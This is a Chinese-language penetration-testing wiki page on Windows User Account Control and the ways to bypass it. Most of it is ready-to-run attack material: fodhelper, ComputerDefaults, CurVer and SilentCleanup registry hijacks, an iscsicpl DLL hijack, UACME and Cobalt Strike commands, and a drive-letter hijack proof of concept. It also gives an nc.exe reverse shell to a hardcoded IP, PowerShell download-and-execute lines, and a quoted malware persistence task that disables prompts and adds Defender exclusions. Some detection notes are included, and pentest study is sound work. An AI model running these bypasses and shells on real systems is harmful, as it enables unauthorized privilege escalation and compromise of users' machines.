# UAC - 用户帐户控制

{{#include ../../banners/hacktricks-training.md}}

## UAC

[用户帐户控制 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一项针对**需要提升权限的操作显示同意提示**的功能。应用程序具有不同的`完整性`级别，而**高完整性级别**的程序可以执行**可能危及系统安全**的任务。启用 UAC 后，应用程序和任务始终**在非管理员帐户的安全上下文中运行**，除非管理员明确授权这些应用程序/任务以管理员级别的访问权限运行。它是一项便利功能，可防止管理员进行非预期的更改，但不被视为安全边界。<sup>[[2]](#references)</sup>

有关完整性级别的更多信息：


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

启用 UAC 时，管理员用户会获得 2 个令牌：一个标准用户令牌，用于以中完整性级别执行常规操作；另一个则具有管理员权限。

此[页面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)深入介绍了 UAC 的工作方式，包括登录过程、用户体验和 UAC 架构。<sup>[[2]](#references)</sup> 管理员可以使用安全策略，在本地（通过 secpol.msc）配置 UAC 的组织专属设置；也可以在 Active Directory 域环境中通过 Group Policy Objects (GPO) 配置并推送这些设置。各种设置在[此处](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)有详细说明。UAC 有 10 项可配置的 Group Policy 设置。下表提供了更多详情：

| Group Policy 设置                                                                                                                                                                                                                                                                                                                                                           | 注册表项                | 默认设置                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [用户帐户控制：内置管理员帐户的管理员审批模式](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0`（已禁用）                                             |
| [用户帐户控制：管理员处于管理员审批模式时的权限提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5`（在安全桌面上对非 Windows 二进制文件提示同意） |
| [用户帐户控制：标准用户的权限提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1`（在安全桌面上提示输入凭据）         |
| [用户帐户控制：检测应用程序安装并提示提升权限](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1`（已启用；默认情况下在 Enterprise 版中禁用）           |
| [用户帐户控制：仅提升经过签名和验证的可执行文件](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0`（已禁用）                                             |
| [用户帐户控制：仅提升安装在安全位置的 UIAccess 应用程序](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1`（已启用）                                              |
| [用户帐户控制：以管理员审批模式运行所有管理员](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1`（已启用）                                              |
| [用户帐户控制：允许 UIAccess 应用程序在不使用安全桌面的情况下提示提升权限](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0`（已禁用）                                             |
| [用户帐户控制：提示提升权限时切换到安全桌面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1`（已启用）                                              |
| [用户帐户控制：将文件和注册表写入失败虚拟化到每用户位置](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1`（已启用）                                              |

### Windows 软件安装策略

默认情况下，**本地安全策略**（大多数系统上的 "secpol.msc"）设置为**禁止非管理员用户安装软件**。这意味着，即使非管理员用户可以下载软件安装程序，也无法在没有管理员帐户的情况下运行它。

### 强制 UAC 要求提升权限的注册表项

作为没有管理员权限的标准用户，你可以确保"标准"帐户在尝试执行某些操作时，**会收到 UAC 凭据提示**。此操作需要修改特定的**注册表项**，而修改这些注册表项需要管理员权限，除非存在 **UAC bypass**，或者攻击者已经以管理员身份登录。

即使用户属于 **Administrators** 组，这些更改也会强制用户**重新输入帐户凭据**才能执行管理操作。

**实际上，只有在你已经获得提升权限的令牌、利用了 UAC bypass，或遇到允许你修改这些注册表项的错误配置时，这才有用；否则，注册表写入本身就会被阻止。**

需要修改的注册表项和值如下（括号内为默认值）：

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`：
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

也可以通过 Local Security Policy 工具手动完成此操作。更改后，执行管理操作时，系统会提示用户重新输入凭据。

### 注意

**用户帐户控制不是安全边界。**因此，标准用户无法在没有本地提权漏洞利用的情况下逃离其帐户并获得管理员权限。

### 向用户请求“完全访问计算机”

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC 权限

- Internet Explorer Protected Mode 使用完整性检查，防止高完整性级别的进程（如 Web 浏览器）访问低完整性级别的数据（如临时 Internet 文件夹）。这是通过使用低完整性令牌运行浏览器实现的。当浏览器尝试访问存储在低完整性区域中的数据时，操作系统会检查进程的完整性级别，并据此允许访问。此功能有助于防止远程代码执行攻击访问系统上的敏感数据。
- 用户登录 Windows 时，系统会创建一个访问令牌，其中包含用户权限列表。权限由用户权利和能力组合而成。令牌还包含用户凭据列表，这些凭据用于向计算机和网络资源验证用户身份。

### Autoadminlogon

要将 Windows 配置为在启动时自动登录特定用户，请设置 **`AutoAdminLogon` 注册表项**。这对于 kiosk 环境或测试很有用。仅在安全的系统上使用此功能，因为它会将密码暴露在注册表中。

使用注册表编辑器或 `reg add` 设置以下项：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`：
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

要恢复正常登录行为，请将 `AutoAdminLogon` 设为 0。

## UAC bypass

> [!TIP]
> 请注意，如果你能以图形方式访问受害者，UAC bypass 很简单，因为 UAC 提示出现时，你只需点击“Yes”

在以下情况下需要 UAC bypass：**UAC 已启用，你的进程在中完整性上下文中运行，并且你的用户属于 administrators 组**。

需要指出的是，如果 UAC 处于最高安全级别（Always），绕过它会比处于其他任意级别（Default）困难得多。

### 从中完整性 shell 快速分诊

尝试 bypass 之前，请确认你处于正确的场景，并根据已知可用的方法确定主机版本：

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

实用说明：
- 如果 `EnableLUA=0`，则无需绕过：任何管理员令牌都可以直接请求高完整性级别。
- `ConsentPromptBehaviorAdmin=2` 或 `5` 是 auto-elevate / 基于 COM 的绕过的常见场景。
- `Always Notify` 会提高门槛，但仍应测试确切的 build，而不是直接假定会失败：UACME 仍在跟踪一些与 `AlwaysNotify` 兼容的方法，这些方法适用于现代 Windows build。<sup>[[3]](#references)</sup>

### UAC 已禁用

如果 UAC 已被禁用（`ConsentPromptBehaviorAdmin` 为 **`0`**），你可以使用类似以下方法**以管理员权限执行 reverse shell**（高完整性级别）：

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### 使用 token duplication 绕过 UAC

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + 可复用的 debug object

AppInfo local RPC 接口 `201ef99a-7fa0-444c-9399-19ba84f12a1a` 可以创建启用了 debugging 的进程。在同一线程上通过 debug 创建的进程会共享该线程的 debug object；创建 debug event 会携带一个完全访问权限的进程句柄，即使 RPC 结果本身只授予有限访问权限也是如此。这使得复用 debug object 成为 Administrators 组中 medium-integrity 成员可用的 UAC 原语。<sup>[[11]](#references)[[12]](#references)</sup>

一种实用的操作链如下：<sup>[[11]](#references)[[12]](#references)</sup>

1. 调用 local RPC 方法（直接调用或通过 `NdrAsyncClientCall`），创建一个启用了 debugging 的非提权牺牲进程。
2. 使用 `NtQueryInformationProcess` 查询 `ProcessDebugObjectHandle`，通过 `NtRemoveProcessDebug` 分离并保留该 object，然后终止牺牲进程。
3. 使用相同的 RPC 接口创建一个受信任的 auto-elevated 进程，然后通过 `DbgUiSetThreadDebugObject` 将保存的 object 关联到调用线程。
4. 调用 `WaitForDebugEvent` 并获取 `CREATE_PROCESS_DEBUG_EVENT` 进程句柄；在继续执行之前，使用 `NtDuplicateObject` 复制该句柄。
5. 将复制的句柄传给 `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)`，并使用扩展的 startup-info 结构启动 payload。这样既复用了提权进程的上下文，也使子进程拥有看似受信任的父子关系。

检测时应关注这一短序列，而不只是 auto-elevated 二进制文件：local AppInfo RPC 创建进程、查询 `ProcessDebugObjectHandle`、分离/重新附加 debugger、紧接着出现创建 debug event、复制句柄，以及记录的父进程与调用创建 API 的进程不匹配的子进程。<sup>[[12]](#references)</sup>

### **非常**基础的 UAC“绕过”（完全文件系统访问权限）

如果你拥有一个属于 Administrators 组的用户 shell，就可以通过 SMB 将共享 `C$` **挂载**到本地的新磁盘上，从而**访问文件系统中的所有内容**（甚至包括 Administrator 的主目录）。

> [!WARNING]
> **看起来这个技巧已经失效了**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### 使用 Cobalt Strike 绕过 UAC

Cobalt Strike 技术只有在 UAC 未设置为最高安全级别时才有效。

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** 和 **Metasploit** 也有多个用于**绕过** **UAC** 的模块。

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

在现代版本中，自动提升权限的 COM 对象仍是实用的 UAC 攻击面。UACME 仍将 `ICMLuaUtil` 标记为适用于当前 Windows 分支，而攻击工具也不断调整 `CMSTPLUA` 的用法：结合交互式桌面进程、64 位执行，有时还会在调用 COM Elevation Moniker 前进行 PEB/进程伪装。<sup>[[3]](#references)</sup>

实用建议：
- 优先使用用户**交互式会话**中的 **64 位**进程（通常是 `explorer.exe` 或其子进程）。
- 如果原始 shell 失败，请改用 BOF / UACME 实现重试，而不是使用简单的 `CreateProcess` 封装。
- 预期子进程会在**单独的提升权限进程**中运行；许多 BOF 不会就地提升当前 beacon 的权限。

### KRBUACBypass

文档和工具见 [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC 绕过漏洞利用

[**UACME**](https://github.com/hfiref0x/UACME) 是一个 UAC 绕过技术集合。使用 Visual Studio 或 MSBuild 编译；构建会生成多个可执行文件（例如 `Source\Akagi\output\x64\Debug\Akagi.exe`），因此请选择适用于目标版本的方法。<sup>[[3]](#references)</sup>\
请注意：某些绕过方法会启动可见程序或提示，可能引起用户警觉。<sup>[[3]](#references)</sup>

UACME 标注了每种技术开始生效的**构建版本**。<sup>[[3]](#references)</sup>你可以搜索适用于你的版本的技术：

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

此外，利用[此页面](https://en.wikipedia.org/wiki/Windows_10_version_history)可以根据 build 版本得出 Windows 发布版本 `1607`。

实际操作时，建议先**评估主机 build**，然后再执行匹配的方法：

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` 会快速将本地版本与其已知的 UAC 方法进行比较，这有助于快速排除已失效的 PoC。<sup>[[4]](#references)</sup>
- `UACME` 仍是用于将绕过方法对应到精确版本的最佳公开目录。3.7.1 版本新增了方法 83–85，而前一版则针对 **Windows 11 25H2** 重新测试了现有方法；请重新检查方法表和发行说明，不要假设旧 PoC 仍然适用且未经修改。<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify-capable WNF/UIAccess chains (UACME 3.7.1)

`Always Notify` 并不能消除所有 UAC 绕过方法。UACME 3.7.1 实现了三种新的 x64 方法，它们将用户可控的环境/协议状态与提升权限的计划任务或 UIAccess 行为结合起来，并且都标记为 `AlwaysNotify compatible`：<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent：**重定向 `SystemRoot`，使由 WNF 触发的 `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` 令提升权限的 `taskhostw.exe` 对 `unifiedconsent.dll` 进行 side-load。UACME 从 Windows 10 build 19041 起追踪此方法。
- **84 — TabTip：**对 UIAccess `TabTip.exe` 使用相同的环境变量原语；它会根据版本加载 `windows.storage.dll`、`ApplicationTargetedFeatureDatabase.dll` 或 `rsaenh.dll`，然后从由此获得的高完整性 UIAccess 上下文 pivot。UACME 从 Windows 8.1 / Server 2016 起追踪此方法。
- **85 — Narrator：**劫持每用户的 `feedback-hub` 协议，通过 `Alt+CapsLock+F` 操控 Narrator，然后启动可写副本 `osk.exe`，使其对 `OskSupport.dll` 进行 side-load。此方法需要交互式桌面，UACME 从 Windows 10 1809 / Server 2019 起追踪此方法。

按照 UACME 文档构建 payload units 和 Akagi 后，调用对应的方法编号（可选命令默认为 `cmd.exe`）：

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

方法 84 和 85 依赖 UIAccess/桌面交互，因此不要指望它们在 Session 0 或非交互式服务 shell 中原样运行。这三种方法都会操纵环境/协议状态并暂存 DLL；测试后请检查实现并移除这些文件。<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe（注册表劫持）

受信任的二进制文件 `fodhelper.exe` 在现代 Windows 上会自动提升权限。启动后，它会查询下方的每用户注册表路径，但不会验证 `DelegateExecute` 动词。在该路径下植入命令，可让 Medium Integrity 进程（用户属于 Administrators 组）在不触发 UAC 提示的情况下启动 High Integrity 进程。

fodhelper 查询的注册表路径：
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShell 步骤（设置你的 payload，然后触发）</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
说明：
- 当前用户属于 Administrators 组，且 UAC 级别为默认/宽松设置时有效（不是带有额外限制的 Always Notify）。
- 在 64 位 Windows 上，使用 `sysnative` 路径从 32 位进程启动 64 位 PowerShell。
- Payload 可以是任意命令（PowerShell、cmd 或 EXE 路径）。为保持隐蔽，避免弹出提示 UI。

#### 使用 `ComputerDefaults.exe` 触发相同的 `ms-settings` 处理程序

`ComputerDefaults.exe` 会解析与 `fodhelper.exe` 相同的每用户 `ms-settings\Shell\Open\command` 关联。<sup>[[13]](#references)[[14]](#references)</sup> 设置好上文中的默认命令和空 `DelegateExecute` 值后，可改用 `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` 触发；无需重复设置注册表。<sup>[[13]](#references)[[14]](#references)</sup> 上文 `fodhelper.exe` 说明中的中等完整性管理员身份和 UAC 策略前提仍然适用。<sup>[[2]](#references)[[3]](#references)</sup> UACME 将此触发方式列为适用于 Windows 10 RS4（build 17134）；请在目标 build 上验证。<sup>[[3]](#references)</sup>

#### CurVer/扩展名劫持变体（仅 HKCU）

近期滥用 `fodhelper.exe` 的样本不再使用 `DelegateExecute`，而是通过每用户 `CurVer` 值**重定向 `ms-settings` ProgID**。自动提升权限的二进制文件仍会在 `HKCU` 下解析处理程序，因此植入这些键无需管理员令牌：<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

一旦获得提权，恶意软件通常会通过将 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` 设为 `0` 来**禁用后续提示**，然后执行其他防御规避操作（例如 `Add-MpPreference -ExclusionPath C:\ProgramData`），并重新创建持久化机制，以高完整性运行。典型的持久化任务会将**XOR 加密的 PowerShell 脚本**存储在磁盘上，并每小时在内存中解码并执行：<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

此变体仍会清理 dropper，只留下 staged payloads，因此检测需要依赖对 **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` 篡改、创建 Defender 排除项，或在内存中解密 PowerShell 的计划任务进行监控。<sup>[[5]](#references)</sup>

### 通过 `SilentCleanup` 任务绕过 UAC（`HKCU\Environment\windir`）

`SilentCleanup` 会以最高权限启动 `cleanmgr.exe`，并从用户环境中展开 `%windir%`。如果你能控制 `HKCU\Environment\windir`，就可以将该展开结果重定向到任意命令，在不显示同意对话框的情况下获得高完整性权限。<sup>[[8]](#references)</sup> 在近期版本上仍值得测试此方法，因为 UACME 仍保留该技术，而近期的问题跟踪显示，Windows 11 24H2 可能只需要稍微调整引号。<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

如果该构建版本会引用路径，请使用以引号结尾的 payload 重试（例如 `cmd.exe"`）。测试后务必清理 `HKCU\Environment\windir`。

#### 更多 UAC bypass

许多利用 UI 流程、COM 对象或桌面交互的经典 UAC bypass 都需要受害者处于**完整的交互式会话**中；常见的 `nc.exe` shell 或运行在 **Session 0** 中的服务通常不够用。

通常可以通过 **meterpreter** 会话解决这个问题。迁移到一个 **Session** 值等于 **1** 的 **process**：

![将 ms-settings 指向自定义扩展名（.thm），并将该扩展名映射到我们的 payload - 更多 UAC bypass：可以通过 meterpreter 会话实现。迁移到一个 Session...](<../../images/image (863).png>)

(_explorer.exe_ 应该可以)

### 使用 GUI 进行 UAC Bypass

如果你可以访问 **GUI，那么只需在 UAC 提示出现时接受它**；实际上并不需要技术上的 bypass。因此，获取 GUI 会话通常就足以绕过 UAC 带来的实际阻碍。

此外，如果你获取了某人正在使用的 GUI 会话（可能通过 RDP），其中**可能有一些以管理员身份运行的工具**，你可以直接从这些工具中**运行**一个例如 **cmd** 的程序，**并以管理员身份运行**，而不会再次收到 UAC 提示，例如 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这种方式可能更**隐蔽**。

### 噪声较大的 UAC 暴力 bypass

如果可以接受产生噪声，可以使用 [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) 之类的工具反复请求提权，直到用户接受。

### 自行实现 bypass - 基础 UAC bypass 方法

查看 **UACME** 后，你会发现**许多 UAC bypass 都利用 DLL hijacking**（通常是让一个已提权的二进制文件从可写路径加载攻击者控制的 DLL）。[阅读本文，了解如何发现 DLL hijacking 漏洞](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. 找到一个会**自动提权**的二进制文件（检查它执行时是否以高完整性级别运行）。
2. 使用 procmon 查找可能存在 **DLL Hijacking** 漏洞的 "**NAME NOT FOUND**" 事件。
3. 你可能需要将 DLL **写入**某些**受保护路径**（例如 C:\Windows\System32），而你没有这些路径的写入权限。你可以通过以下方式绕过：
   1. **wusa.exe**：适用于 Windows 7、8 和 8.1。它允许将 CAB 文件的内容解压到受保护路径中（因为此工具以高完整性级别运行）。
   2. **IFileOperation**：适用于 Windows 10。
4. 准备一个 **script**，将你的 DLL 复制到受保护路径中，并执行存在漏洞且会自动提权的二进制文件。

### 另一种 UAC bypass 技术

此方法是监视 **autoElevated binary** 是否尝试从 **registry** 中**读取**要**执行**的**二进制文件**或**命令**的**名称/路径**（如果该二进制文件会在 **HKCU** 中查找此信息，则更值得关注）。

### 通过 `SysWOW64\iscsicpl.exe` + 用户 `PATH` DLL hijack 实现 UAC bypass

32 位的 `C:\Windows\SysWOW64\iscsicpl.exe` 是一个**自动提权**的二进制文件，可利用搜索顺序让它加载 `iscsiexe.dll`。如果你能将恶意的 `iscsiexe.dll` 放入**用户可写**文件夹，然后修改当前用户的 `PATH`（例如通过 `HKCU\Environment\Path`），使 Windows 搜索该文件夹，Windows 可能会在已提权的 `iscsicpl.exe` 进程中加载攻击者的 DLL，**而不会显示 UAC 提示**。<sup>[[1]](#references)[[6]](#references)</sup>

实用注意事项：
- 当前用户属于 **Administrators** 组、但因 UAC 而以 **Medium Integrity** 运行时，这种方法很有用。
- 此 bypass 使用的是 **SysWOW64** 副本。请将 **System32** 副本视为独立的二进制文件，并单独验证其行为。
- 该原语结合了**自动提权**和 **DLL 搜索顺序劫持**，因此可使用其他 UAC bypass 中的相同 ProcMon 工作流程，验证是否存在缺失的 DLL 加载。

最简流程：

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

检测思路：
- 对紧接着执行 `C:\Windows\SysWOW64\iscsicpl.exe` 的 `reg add` / 写入 `HKCU\Environment\Path` 的注册表操作发出警报。
- 搜索 `%TEMP%` 或 `%LOCALAPPDATA%\Microsoft\WindowsApps` 等**用户可控**位置中的 `iscsiexe.dll`。
- 将 `iscsicpl.exe` 的启动与异常子进程或从常规 Windows 目录之外加载的 DLL 关联起来。

### 值得单独检查的较新研究

一些 2024 年之后的攻击链不再采用经典的 `HKCU\Software\Classes` 注册表劫持。例如，activation-context cache poisoning 可以串联 **drive remap** 和 **DLL redirection**，通过受信任的 UI / 自动提权二进制文件（如 `ctfmon.exe`）及后续目标（如 `fodhelper.exe`），实现从中完整性提升到高完整性。这里不重复大型 PoC，请查看以下精简 payload 示例：

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection（预览版）：通过每个登录会话的 DOS 设备映射劫持驱动器号

> [!NOTE]
> 截至 2026 年 8 月，Microsoft 仍将 Administrator Protection 标记为 **Insider 预览版**：2025 年 10 月的推出已被撤回，计划稍后再推出。在测试这些攻击链之前，请确认已实际启用 **Admin Approval Mode with Administrator protection**，并且设备已重启；仅凭标准的 25H2 版本字符串无法证明该功能已启用。<sup>[[10]](#references)</sup>

有关 Windows 11 25H2 预览版中完整的 `RAiLaunchAdminProcess` / UIAccess 攻击面，请查看专门页面：

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 的“Administrator Protection”使用带有每会话 `\Sessions\0\DosDevices/<LUID>` 映射的 shadow-admin 令牌。该目录由 `SeGetTokenDeviceMap` 在首次解析 `\??` 时按需创建。如果攻击者仅以 **SecurityIdentification** 级别模拟 shadow-admin 令牌，该目录就会以攻击者为**所有者**（继承 `CREATOR OWNER`），从而允许创建优先于 `\GLOBAL??` 的驱动器号链接。<sup>[[7]](#references)</sup>

**步骤：**

1. 在低权限会话中，调用 `RAiProcessRunOnce`，以无提示方式启动 shadow-admin `runonce.exe`。
2. 将其主令牌复制为 **identification** 令牌，并在打开 `\??` 时模拟该令牌，以强制在攻击者所有权下创建 `\Sessions\0\DosDevices/<LUID>`。
3. 在该目录中创建一个指向攻击者控制存储位置的 `C:` 符号链接；此后该会话中的文件系统访问会将 `C:` 解析到攻击者路径，从而实现 DLL / 文件劫持。

**PowerShell PoC（NtObjectManager）：**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

在预览版主机上，Administrator Protection 会在 `Microsoft-Windows-LUA` 提供程序下将批准和失败记录为 ETW 事件 **15031** 和 **15032**。这些事件包含请求者 SID、应用程序路径、结果、受管理的管理员帐户和身份验证方法，因此，反复尝试利用漏洞或尝试驱动 UI 失败都不会不留下遥测记录。<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – 用户帐户控制的工作原理](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass 技术合集](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass 兼容性扫描器和启动器](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI 采用 AI 生成 PowerShell 后门](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
